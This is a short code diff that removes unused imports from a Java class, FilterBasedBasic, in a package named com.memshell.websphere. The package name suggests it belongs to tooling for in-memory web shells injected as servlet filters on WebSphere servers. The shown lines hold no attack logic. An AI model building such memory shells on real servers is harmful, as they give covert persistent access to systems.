@@ -1,21 +1,14 @@
 package com.memshell.websphere;
 
-import com.memshell.generic.Config;
 import com.memshell.generic.FilterTemplate;
-
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import java.io.File;
-import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.EnumSet;
 import java.util.List;
-import java.util.Scanner;
 
 public class FilterBasedBasic extends HttpServlet {
     @Override
